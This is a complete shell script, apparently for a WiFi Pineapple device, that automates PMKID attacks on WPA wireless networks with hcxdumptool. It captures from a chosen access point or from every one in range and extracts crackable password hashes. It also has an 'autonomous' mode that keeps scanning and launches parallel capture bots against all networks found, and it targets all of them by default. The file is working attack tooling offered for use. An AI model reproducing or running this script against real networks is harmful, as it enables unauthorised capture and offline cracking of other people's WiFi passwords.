#!/bin/sh
# iFINITEAi2025_PiNeApPlErInGs - PMKID Attack Script
# Complete rewrite of xchwarze/wifi-pineapple-community PMKIDAttack.sh
# License: Apache 2.0

set -e

################################################################################
# CENTRALIZED CONFIGURATION
################################################################################

# Wireless interface configuration
PMKID_IFACE="${PMKID_IFACE:-wlan1mon}"

# Capture timing parameters
PMKID_TIMEOUT="${PMKID_TIMEOUT:-120}"
PMKID_MAX_RETRIES="${PMKID_MAX_RETRIES:-3}"
PMKID_RETRY_DELAY="${PMKID_RETRY_DELAY:-5}"

# Bot/scanning configuration
PMKID_BOT_COUNT="${PMKID_BOT_COUNT:-4}"
PMKID_SCAN_INTERVAL="${PMKID_SCAN_INTERVAL:-30}"

# Logging and output
PMKID_LOG_LEVEL="${PMKID_LOG_LEVEL:-info}"
PMKID_OUTPUT_DIR="${PMKID_OUTPUT_DIR:-/tmp/pmkid_results}"

# Channel hopping
PMKID_CHANNEL_HOP="${PMKID_CHANNEL_HOP:-1}"

# Target filtering
PMKID_TARGET_MODE="${PMKID_TARGET_MODE:-all}"

# Paths
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WHITELIST_FILE="${SCRIPT_DIR}/targets_whitelist.txt"
BLACKLIST_FILE="${SCRIPT_DIR}/targets_blacklist.txt"
PID_DIR="${PMKID_OUTPUT_DIR}/pids"
CAPTURE_DIR="${PMKID_OUTPUT_DIR}/captures"
HASH_DIR="${PMKID_OUTPUT_DIR}/hashes"

# UCI paths (for OpenWrt compatibility)
UCI_PACKAGE="pmkidattack"

################################################################################
# LOGGING FUNCTIONS
################################################################################

# Log level hierarchy: debug=0, info=1, warn=2, error=3
get_log_level_num() {
    case "$1" in
        debug) echo 0 ;;
        info) echo 1 ;;
        warn) echo 2 ;;
        error) echo 3 ;;
        *) echo 1 ;;
    esac
}

# Log function with level filtering
log() {
    _level="$1"
    shift
    _message="$*"
    
    _current_level=$(get_log_level_num "$PMKID_LOG_LEVEL")
    _msg_level=$(get_log_level_num "$_level")
    
    if [ "$_msg_level" -ge "$_current_level" ]; then
        _timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        printf "[%s] [%s] %s\n" "$_timestamp" "$_level" "$_message" >&2
    fi
}

# Error message and exit
die() {
    log error "$*"
    exit 1
}

################################################################################
# HELPER FUNCTIONS
################################################################################

# Display usage information
usage() {
    cat <<'EOF'
iFINITEAi2025_PiNeApPlErInGs - PMKID Attack Script

USAGE:
    PMKIDAttack.sh <command> [arguments]

COMMANDS:
    start <BSSID>        Capture PMKID for specific BSSID (foreground)
    start-bg <BSSID>     Capture PMKID for specific BSSID (background)
    start-all            Capture PMKIDs from all nearby APs (foreground)
    stop                 Stop all running captures
    status               Check if capture is running
    check <BSSID>        Extract PMKID hash from capture file
    check-bg <BSSID>     Extract PMKID hash (background)
    check-all            Extract all PMKID hashes
    check-all-bg         Extract all hashes (background)
    scan                 Discover and list nearby APs
    auto                 AI autonomous mode - scan, capture, retry
    auto-stop            Stop autonomous mode
    report               Generate summary report
    clean                Clean up temp files and captures
    config               Display current configuration

ENVIRONMENT VARIABLES:
    PMKID_IFACE          Wireless interface (default: wlan1mon)
    PMKID_TIMEOUT        Capture timeout in seconds (default: 120)
    PMKID_MAX_RETRIES    Max retry attempts per target (default: 3)
    PMKID_RETRY_DELAY    Delay between retries in seconds (default: 5)
    PMKID_BOT_COUNT      Number of parallel bots (default: 4)
    PMKID_SCAN_INTERVAL  Re-scan interval in seconds (default: 30)
    PMKID_LOG_LEVEL      Logging: debug|info|warn|error (default: info)
    PMKID_OUTPUT_DIR     Output directory (default: /tmp/pmkid_results)
    PMKID_CHANNEL_HOP    Channel hopping: 1|0 (default: 1)
    PMKID_TARGET_MODE    Target mode: all|whitelist|blacklist (default: all)

EXAMPLES:
    # Capture from specific AP
    ./PMKIDAttack.sh start AA:BB:CC:DD:EE:FF
    
    # Run autonomous mode with 8 parallel bots
    PMKID_BOT_COUNT=8 ./PMKIDAttack.sh auto
    
    # Scan for APs
    ./PMKIDAttack.sh scan
    
    # Generate report
    ./PMKIDAttack.sh report

For more information, see README.md
EOF
}

# Sanitize BSSID - removes colons/dashes/dots, lowercases, validates
sanitize_bssid() {
    _bssid="$1"
    
    # Remove colons, dashes, dots
    _clean=$(echo "$_bssid" | tr -d ':.-' | tr '[:upper:]' '[:lower:]')
    
    # Validate: exactly 12 hex characters
    if ! echo "$_clean" | grep -qE '^[0-9a-f]{12}$'; then
        die "Invalid BSSID: $_bssid (must be 12 hex chars)"
    fi
    
    echo "$_clean"
}

# Format BSSID with colons (aa:bb:cc:dd:ee:ff)
format_bssid() {
    _clean="$1"
    echo "$_clean" | sed 's/../&:/g; s/:$//'
}

# UCI configuration management
uci_set_attack() {
    _section="$1"
    _option="$2"
    _value="$3"
    
    if command -v uci >/dev/null 2>&1; then
        uci set "${UCI_PACKAGE}.${_section}.${_option}=${_value}" 2>/dev/null || true
        uci commit "${UCI_PACKAGE}" 2>/dev/null || true
        log debug "UCI set: ${_section}.${_option} = ${_value}"
    fi
}

# Auto-detect pcap conversion tool
detect_pcaptool() {
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        echo "hcxpcapngtool"
    elif command -v hcxpcaptool >/dev/null 2>&1; then
        echo "hcxpcaptool"
    else
        die "Neither hcxpcapngtool nor hcxpcaptool found. Install hcxtools."
    fi
}

# Save PID to file
save_pid() {
    _name="$1"
    _pid="$2"
    echo "$_pid" > "${PID_DIR}/${_name}.pid"
    log debug "Saved PID $_pid for $_name"
}

# Cleanup PID file
cleanup_pid() {
    _name="$1"
    rm -f "${PID_DIR}/${_name}.pid"
    log debug "Cleaned up PID for $_name"
}

# Get PID from file
get_pid() {
    _name="$1"
    if [ -f "${PID_DIR}/${_name}.pid" ]; then
        cat "${PID_DIR}/${_name}.pid"
    fi
}

# Check if process is running
is_running() {
    _pid="$1"
    if [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null; then
        return 0
    fi
    return 1
}

# Ensure all required directories exist
ensure_dirs() {
    mkdir -p "$PMKID_OUTPUT_DIR"
    mkdir -p "$PID_DIR"
    mkdir -p "$CAPTURE_DIR"
    mkdir -p "$HASH_DIR"
    log debug "Ensured directories exist"
}

# Check for required dependencies
check_dependencies() {
    _missing=""
    
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        _missing="${_missing} hcxdumptool"
    fi
    
    if ! command -v hcxpcapngtool >/dev/null 2>&1 && ! command -v hcxpcaptool >/dev/null 2>&1; then
        _missing="${_missing} hcxpcapngtool/hcxpcaptool"
    fi
    
    if [ -n "$_missing" ]; then
        die "Missing dependencies:$_missing"
    fi
    
    log debug "All dependencies available"
}

# Validate wireless interface
validate_interface() {
    if ! ip link show "$PMKID_IFACE" >/dev/null 2>&1; then
        die "Interface $PMKID_IFACE not found"
    fi
    
    # Check if in monitor mode (basic check)
    if ! iwconfig "$PMKID_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        log warn "Interface $PMKID_IFACE may not be in monitor mode"
    fi
    
    log debug "Interface $PMKID_IFACE validated"
}

################################################################################
# TARGET FILTERING
################################################################################

# Check if BSSID is in whitelist
in_whitelist() {
    _bssid="$1"
    
    if [ ! -f "$WHITELIST_FILE" ]; then
        return 1
    fi
    
    _clean=$(sanitize_bssid "$_bssid")
    
    while IFS= read -r _line || [ -n "$_line" ]; do
        # Skip empty lines and comments
        case "$_line" in
            ''|'#'*) continue ;;
        esac
        
        _target=$(sanitize_bssid "$_line" 2>/dev/null || true)
        if [ "$_target" = "$_clean" ]; then
            return 0
        fi
    done < "$WHITELIST_FILE"
    
    return 1
}

# Check if BSSID is in blacklist
in_blacklist() {
    _bssid="$1"
    
    if [ ! -f "$BLACKLIST_FILE" ]; then
        return 1
    fi
    
    _clean=$(sanitize_bssid "$_bssid")
    
    while IFS= read -r _line || [ -n "$_line" ]; do
        # Skip empty lines and comments
        case "$_line" in
            ''|'#'*) continue ;;
        esac
        
        _target=$(sanitize_bssid "$_line" 2>/dev/null || true)
        if [ "$_target" = "$_clean" ]; then
            return 0
        fi
    done < "$BLACKLIST_FILE"
    
    return 1
}

# Check if target should be processed based on TARGET_MODE
should_process_target() {
    _bssid="$1"
    
    case "$PMKID_TARGET_MODE" in
        all)
            return 0
            ;;
        whitelist)
            if in_whitelist "$_bssid"; then
                return 0
            fi
            return 1
            ;;
        blacklist)
            if in_blacklist "$_bssid"; then
                return 1
            fi
            return 0
            ;;
        *)
            log warn "Unknown TARGET_MODE: $PMKID_TARGET_MODE, using 'all'"
            return 0
            ;;
    esac
}

################################################################################
# CAPTURE FUNCTIONS
################################################################################

# Capture PMKID for specific BSSID with retry logic
capture_pmkid() {
    _bssid="$1"
    _attempt="${2:-1}"
    
    _clean=$(sanitize_bssid "$_bssid")
    _formatted=$(format_bssid "$_clean")
    _output="${CAPTURE_DIR}/${_clean}.pcapng"
    
    log info "Capturing PMKID from $_formatted (attempt $_attempt/$PMKID_MAX_RETRIES)"
    
    # Build hcxdumptool command
    _cmd="hcxdumptool -i \"$PMKID_IFACE\" -o \"$_output\" --filterlist_ap=\"$_formatted\" --filtermode=2 --enable_status=1"
    
    if [ "$PMKID_CHANNEL_HOP" = "1" ]; then
        _cmd="$_cmd --enable_channels=1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48"
    fi
    
    # Run capture with timeout
    timeout "$PMKID_TIMEOUT" sh -c "$_cmd" 2>&1 | while IFS= read -r _line; do
        log debug "hcxdumptool: $_line"
    done || true
    
    # Check if capture file exists and has content
    if [ -f "$_output" ] && [ -s "$_output" ]; then
        log info "Capture complete: $_output"
        uci_set_attack "status" "last_capture" "$_formatted"
        return 0
    else
        log warn "Capture failed for $_formatted"
        
        # Retry logic
        if [ "$_attempt" -lt "$PMKID_MAX_RETRIES" ]; then
            log info "Retrying in $PMKID_RETRY_DELAY seconds..."
            sleep "$PMKID_RETRY_DELAY"
            capture_pmkid "$_bssid" "$((_attempt + 1))"
        else
            log error "Failed to capture PMKID from $_formatted after $PMKID_MAX_RETRIES attempts"
            return 1
        fi
    fi
}

# Extract PMKID hash from capture file
extract_pmkid() {
    _bssid="$1"
    
    _clean=$(sanitize_bssid "$_bssid")
    _formatted=$(format_bssid "$_clean")
    _capture="${CAPTURE_DIR}/${_clean}.pcapng"
    _hashfile="${HASH_DIR}/${_clean}.hash"
    
    if [ ! -f "$_capture" ]; then
        log error "Capture file not found: $_capture"
        return 1
    fi
    
    log info "Extracting PMKID from $_formatted"
    
    _pcaptool=$(detect_pcaptool)
    
    # Extract hash
    "$_pcaptool" -o "$_hashfile" "$_capture" >/dev/null 2>&1 || true
    
    if [ -f "$_hashfile" ] && [ -s "$_hashfile" ]; then
        _hash=$(cat "$_hashfile")
        log info "PMKID extracted: $_hash"
        echo "$_hash"
        uci_set_attack "result" "$_clean" "success"
        return 0
    else
        log warn "No PMKID found in capture from $_formatted"
        uci_set_attack "result" "$_clean" "failed"
        return 1
    fi
}

################################################################################
# SCAN FUNCTION
################################################################################

# Scan for nearby APs
scan_aps() {
    log info "Scanning for nearby APs on $PMKID_IFACE..."
    
    _scan_file="${PMKID_OUTPUT_DIR}/scan_$(date +%s).txt"
    
    # Use hcxdumptool in scan mode
    timeout 10 hcxdumptool -i "$PMKID_IFACE" --do_rcascan --rcascancount=5 --enable_status=3 2>&1 | \
        grep -E 'FOUND AP|signal|channel' > "$_scan_file" || true
    
    # Alternative: use iwlist if hcxdumptool doesn't support scan
    if [ ! -s "$_scan_file" ]; then
        iwlist "$PMKID_IFACE" scan 2>/dev/null | \
            grep -E 'Address:|Channel:|Signal level:|ESSID:' > "$_scan_file" || true
    fi
    
    if [ -s "$_scan_file" ]; then
        log info "Scan complete, results saved to $_scan_file"
        cat "$_scan_file"
    else
        log warn "No APs found or scan failed"
    fi
    
    echo "$_scan_file"
}

################################################################################
# COMMAND IMPLEMENTATIONS
################################################################################

# start: Capture PMKID for specific BSSID (foreground)
cmd_start() {
    _bssid="${1:-}"
    if [ -z "$_bssid" ]; then
        die "Usage: start <BSSID>"
    fi
    
    check_dependencies
    validate_interface
    ensure_dirs
    
    capture_pmkid "$_bssid"
}

# start-bg: Capture PMKID for specific BSSID (background)
cmd_start_bg() {
    _bssid="${1:-}"
    if [ -z "$_bssid" ]; then
        die "Usage: start-bg <BSSID>"
    fi
    
    check_dependencies
    validate_interface
    ensure_dirs
    
    _clean=$(sanitize_bssid "$_bssid")
    
    # Start capture in background
    (capture_pmkid "$_bssid" >> "${PMKID_OUTPUT_DIR}/capture_${_clean}.log" 2>&1) &
    _pid=$!
    
    save_pid "capture_${_clean}" "$_pid"
    log info "Started background capture for $_bssid (PID: $_pid)"
}

# start-all: Capture PMKIDs from all nearby APs
cmd_start_all() {
    check_dependencies
    validate_interface
    ensure_dirs
    
    log info "Starting capture from all nearby APs"
    
    _output="${CAPTURE_DIR}/all_$(date +%s).pcapng"
    
    _cmd="hcxdumptool -i \"$PMKID_IFACE\" -o \"$_output\" --enable_status=1"
    
    if [ "$PMKID_CHANNEL_HOP" = "1" ]; then
        _cmd="$_cmd --enable_channels=1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48"
    fi
    
    timeout "$PMKID_TIMEOUT" sh -c "$_cmd" 2>&1 | while IFS= read -r _line; do
        log debug "hcxdumptool: $_line"
    done || true
    
    if [ -f "$_output" ] && [ -s "$_output" ]; then
        log info "Capture complete: $_output"
    else
        log error "Capture failed"
        return 1
    fi
}

# stop: Stop all running captures
cmd_stop() {
    log info "Stopping all captures..."
    
    _stopped=0
    
    # Stop using PID files
    if [ -d "$PID_DIR" ]; then
        for _pidfile in "$PID_DIR"/*.pid; do
            if [ -f "$_pidfile" ]; then
                _pid=$(cat "$_pidfile")
                if is_running "$_pid"; then
                    kill "$_pid" 2>/dev/null || true
                    log info "Stopped process $_pid"
                    _stopped=$((_stopped + 1))
                fi
                rm -f "$_pidfile"
            fi
        done
    fi
    
    # Fallback: pkill hcxdumptool
    if pgrep -x hcxdumptool >/dev/null 2>&1; then
        pkill -x hcxdumptool || true
        _stopped=$((_stopped + 1))
        log info "Stopped hcxdumptool via pkill"
    fi
    
    if [ "$_stopped" -eq 0 ]; then
        log info "No running captures found"
    else
        log info "Stopped $_stopped capture(s)"
    fi
}

# status: Check if capture is running
cmd_status() {
    _running=0
    
    # Check PID files
    if [ -d "$PID_DIR" ]; then
        for _pidfile in "$PID_DIR"/*.pid; do
            if [ -f "$_pidfile" ]; then
                _pid=$(cat "$_pidfile")
                if is_running "$_pid"; then
                    _name=$(basename "$_pidfile" .pid)
                    echo "Running: $_name (PID: $_pid)"
                    _running=$((_running + 1))
                fi
            fi
        done
    fi
    
    # Check via pgrep
    if pgrep -x hcxdumptool >/dev/null 2>&1; then
        _pids=$(pgrep -x hcxdumptool)
        for _pid in $_pids; do
            echo "Running: hcxdumptool (PID: $_pid)"
            _running=$((_running + 1))
        done
    fi
    
    if [ "$_running" -eq 0 ]; then
        echo "No captures running"
        return 1
    fi
    
    return 0
}

# check: Extract PMKID hash from capture file
cmd_check() {
    _bssid="${1:-}"
    if [ -z "$_bssid" ]; then
        die "Usage: check <BSSID>"
    fi
    
    ensure_dirs
    extract_pmkid "$_bssid"
}

# check-bg: Extract PMKID hash (background)
cmd_check_bg() {
    _bssid="${1:-}"
    if [ -z "$_bssid" ]; then
        die "Usage: check-bg <BSSID>"
    fi
    
    ensure_dirs
    
    _clean=$(sanitize_bssid "$_bssid")
    
    (extract_pmkid "$_bssid" >> "${PMKID_OUTPUT_DIR}/check_${_clean}.log" 2>&1) &
    _pid=$!
    
    log info "Started background hash extraction for $_bssid (PID: $_pid)"
}

# check-all: Extract all PMKID hashes
cmd_check_all() {
    ensure_dirs
    
    log info "Extracting PMKIDs from all capture files..."
    
    _count=0
    for _capture in "$CAPTURE_DIR"/*.pcapng; do
        if [ -f "$_capture" ]; then
            _basename=$(basename "$_capture" .pcapng)
            
            # Skip if not a BSSID pattern
            if ! echo "$_basename" | grep -qE '^[0-9a-f]{12}$'; then
                continue
            fi
            
            if extract_pmkid "$_basename" >/dev/null 2>&1; then
                _count=$((_count + 1))
            fi
        fi
    done
    
    log info "Extracted PMKIDs from $_count capture(s)"
}

# check-all-bg: Extract all hashes (background)
cmd_check_all_bg() {
    ensure_dirs
    
    (cmd_check_all >> "${PMKID_OUTPUT_DIR}/check_all.log" 2>&1) &
    _pid=$!
    
    log info "Started background extraction of all hashes (PID: $_pid)"
}

# scan: Discover and list nearby APs
cmd_scan() {
    check_dependencies
    validate_interface
    ensure_dirs
    
    scan_aps
}

# auto: AI autonomous mode
cmd_auto() {
    check_dependencies
    validate_interface
    ensure_dirs
    
    log info "Starting autonomous PMKID capture mode"
    log info "Bot count: $PMKID_BOT_COUNT, Scan interval: ${PMKID_SCAN_INTERVAL}s"
    
    _auto_log="${PMKID_OUTPUT_DIR}/auto.log"
    _results_file="${PMKID_OUTPUT_DIR}/results.txt"
    _targets_file="${PMKID_OUTPUT_DIR}/targets.txt"
    
    # Initialize results file
    if [ ! -f "$_results_file" ]; then
        echo "# PMKID Capture Results" > "$_results_file"
        echo "# Format: BSSID|Status|Timestamp" >> "$_results_file"
    fi
    
    # Trap signals for clean shutdown
    trap 'log info "Caught signal, stopping auto mode..."; cmd_auto_stop; exit 0' INT TERM
    
    # Save main PID
    save_pid "auto_main" "$$"
    
    # Main autonomous loop
    while true; do
        log info "Scanning for targets..."
        
        # Scan and build target list
        _scan_file=$(scan_aps)
        
        # Parse scan results to extract BSSIDs
        # This is a simplified parser - real implementation would be more robust
        if [ -f "$_scan_file" ] && [ -s "$_scan_file" ]; then
            grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$_scan_file" | \
                sort -u > "$_targets_file" || true
        fi
        
        if [ ! -s "$_targets_file" ]; then
            log warn "No targets found, waiting..."
            sleep "$PMKID_SCAN_INTERVAL"
            continue
        fi
        
        # Count available targets
        _target_count=$(wc -l < "$_targets_file")
        log info "Found $_target_count potential target(s)"
        
        # Process targets with bot pool
        _active_bots=0
        
        while IFS= read -r _target || [ -n "$_target" ]; do
            # Skip if empty
            if [ -z "$_target" ]; then
                continue
            fi
            
            # Apply target filtering
            if ! should_process_target "$_target"; then
                log debug "Skipping filtered target: $_target"
                continue
            fi
            
            # Check if already captured
            _clean=$(sanitize_bssid "$_target")
            if [ -f "${HASH_DIR}/${_clean}.hash" ]; then
                log debug "Already captured: $_target"
                continue
            fi
            
            # Wait for available bot slot
            while [ "$_active_bots" -ge "$PMKID_BOT_COUNT" ]; do
                # Check for completed bots
                for _bot_pid_file in "$PID_DIR"/bot_*.pid; do
                    if [ -f "$_bot_pid_file" ]; then
                        _bot_pid=$(cat "$_bot_pid_file")
                        if ! is_running "$_bot_pid"; then
                            rm -f "$_bot_pid_file"
                            _active_bots=$((_active_bots - 1))
                        fi
                    fi
                done
                
                sleep 1
            done
            
            # Launch bot for this target
            (
                _bot_clean=$(sanitize_bssid "$_target")
                _bot_formatted=$(format_bssid "$_bot_clean")
                
                log info "Bot processing target: $_bot_formatted"
                
                if capture_pmkid "$_target"; then
                    if extract_pmkid "$_target" >/dev/null 2>&1; then
                        echo "${_bot_formatted}|success|$(date '+%Y-%m-%d %H:%M:%S')" >> "$_results_file"
                        log info "Bot success: $_bot_formatted"
                    else
                        echo "${_bot_formatted}|no_pmkid|$(date '+%Y-%m-%d %H:%M:%S')" >> "$_results_file"
                        log warn "Bot no PMKID: $_bot_formatted"
                    fi
                else
                    echo "${_bot_formatted}|failed|$(date '+%Y-%m-%d %H:%M:%S')" >> "$_results_file"
                    log warn "Bot failed: $_bot_formatted"
                fi
            ) >> "$_auto_log" 2>&1 &
            
            _bot_pid=$!
            save_pid "bot_${_clean}" "$_bot_pid"
            _active_bots=$((_active_bots + 1))
            
            log debug "Launched bot for $_target (PID: $_bot_pid, active: $_active_bots)"
            
        done < "$_targets_file"
        
        # Wait for all bots to complete
        log info "Waiting for active bots to complete..."
        while [ "$_active_bots" -gt 0 ]; do
            for _bot_pid_file in "$PID_DIR"/bot_*.pid; do
                if [ -f "$_bot_pid_file" ]; then
                    _bot_pid=$(cat "$_bot_pid_file")
                    if ! is_running "$_bot_pid"; then
                        rm -f "$_bot_pid_file"
                        _active_bots=$((_active_bots - 1))
                    fi
                fi
            done
            sleep 1
        done
        
        log info "Scan cycle complete, waiting ${PMKID_SCAN_INTERVAL}s before next scan..."
        sleep "$PMKID_SCAN_INTERVAL"
    done
}

# auto-stop: Stop autonomous mode
cmd_auto_stop() {
    log info "Stopping autonomous mode..."
    
    # Stop main auto process
    _auto_pid=$(get_pid "auto_main")
    if [ -n "$_auto_pid" ] && is_running "$_auto_pid"; then
        kill "$_auto_pid" 2>/dev/null || true
        log info "Stopped main auto process (PID: $_auto_pid)"
    fi
    cleanup_pid "auto_main"
    
    # Stop all bot processes
    for _bot_pid_file in "$PID_DIR"/bot_*.pid; do
        if [ -f "$_bot_pid_file" ]; then
            _bot_pid=$(cat "$_bot_pid_file")
            if is_running "$_bot_pid"; then
                kill "$_bot_pid" 2>/dev/null || true
                log info "Stopped bot (PID: $_bot_pid)"
            fi
            rm -f "$_bot_pid_file"
        fi
    done
    
    # Stop any remaining captures
    cmd_stop
    
    log info "Autonomous mode stopped"
}

# report: Generate summary report
cmd_report() {
    ensure_dirs
    
    echo ""
    echo "============================================"
    echo "  iFINITEAi2025_PiNeApPlErInGs - Report"
    echo "============================================"
    echo ""
    
    # Count captures
    _capture_count=0
    if [ -d "$CAPTURE_DIR" ]; then
        _capture_count=$(find "$CAPTURE_DIR" -name "*.pcapng" -type f | wc -l)
    fi
    echo "Total captures: $_capture_count"
    
    # Count hashes
    _hash_count=0
    if [ -d "$HASH_DIR" ]; then
        _hash_count=$(find "$HASH_DIR" -name "*.hash" -type f | wc -l)
    fi
    echo "Total hashes: $_hash_count"
    
    # Results summary
    _results_file="${PMKID_OUTPUT_DIR}/results.txt"
    if [ -f "$_results_file" ]; then
        echo ""
        echo "Results summary:"
        _success=$(grep -c '|success|' "$_results_file" 2>/dev/null || echo 0)
        _failed=$(grep -c '|failed|' "$_results_file" 2>/dev/null || echo 0)
        _no_pmkid=$(grep -c '|no_pmkid|' "$_results_file" 2>/dev/null || echo 0)
        
        echo "  Success: $_success"
        echo "  Failed: $_failed"
        echo "  No PMKID: $_no_pmkid"
    fi
    
    # List hashes
    if [ "$_hash_count" -gt 0 ]; then
        echo ""
        echo "Extracted hashes:"
        for _hashfile in "$HASH_DIR"/*.hash; do
            if [ -f "$_hashfile" ]; then
                _bssid=$(basename "$_hashfile" .hash)
                _formatted=$(format_bssid "$_bssid")
                echo "  $_formatted: $(head -n 1 "$_hashfile")"
            fi
        done
    fi
    
    echo ""
    echo "============================================"
    echo ""
}

# clean: Clean up temp files and captures
cmd_clean() {
    log info "Cleaning up files..."
    
    # Stop any running processes first
    cmd_auto_stop 2>/dev/null || true
    cmd_stop
    
    # Remove files
    if [ -d "$PMKID_OUTPUT_DIR" ]; then
        rm -rf "${PMKID_OUTPUT_DIR:?}"/*
        log info "Cleaned output directory: $PMKID_OUTPUT_DIR"
    fi
    
    log info "Cleanup complete"
}

# config: Display current configuration
cmd_config() {
    echo ""
    echo "============================================"
    echo "  Current Configuration"
    echo "============================================"
    echo ""
    echo "Interface:       $PMKID_IFACE"
    echo "Timeout:         ${PMKID_TIMEOUT}s"
    echo "Max Retries:     $PMKID_MAX_RETRIES"
    echo "Retry Delay:     ${PMKID_RETRY_DELAY}s"
    echo "Bot Count:       $PMKID_BOT_COUNT"
    echo "Scan Interval:   ${PMKID_SCAN_INTERVAL}s"
    echo "Log Level:       $PMKID_LOG_LEVEL"
    echo "Output Dir:      $PMKID_OUTPUT_DIR"
    echo "Channel Hop:     $PMKID_CHANNEL_HOP"
    echo "Target Mode:     $PMKID_TARGET_MODE"
    echo ""
    echo "Paths:"
    echo "  Script Dir:    $SCRIPT_DIR"
    echo "  Whitelist:     $WHITELIST_FILE"
    echo "  Blacklist:     $BLACKLIST_FILE"
    echo "  PID Dir:       $PID_DIR"
    echo "  Capture Dir:   $CAPTURE_DIR"
    echo "  Hash Dir:      $HASH_DIR"
    echo ""
    echo "============================================"
    echo ""
}

################################################################################
# MAIN DISPATCH
################################################################################

# Main command dispatcher
main() {
    if [ $# -eq 0 ]; then
        usage
        exit 1
    fi
    
    _command="$1"
    shift
    
    case "$_command" in
        start)
            cmd_start "$@"
            ;;
        start-bg)
            cmd_start_bg "$@"
            ;;
        start-all)
            cmd_start_all "$@"
            ;;
        stop)
            cmd_stop "$@"
            ;;
        status)
            cmd_status "$@"
            ;;
        check)
            cmd_check "$@"
            ;;
        check-bg)
            cmd_check_bg "$@"
            ;;
        check-all)
            cmd_check_all "$@"
            ;;
        check-all-bg)
            cmd_check_all_bg "$@"
            ;;
        scan)
            cmd_scan "$@"
            ;;
        auto)
            cmd_auto "$@"
            ;;
        auto-stop)
            cmd_auto_stop "$@"
            ;;
        report)
            cmd_report "$@"
            ;;
        clean)
            cmd_clean "$@"
            ;;
        config)
            cmd_config "$@"
            ;;
        help|--help|-h)
            usage
            exit 0
            ;;
        *)
            echo "Error: Unknown command: $_command" >&2
            echo "" >&2
            usage
            exit 1
            ;;
    esac
}

# Entry point
main "$@"
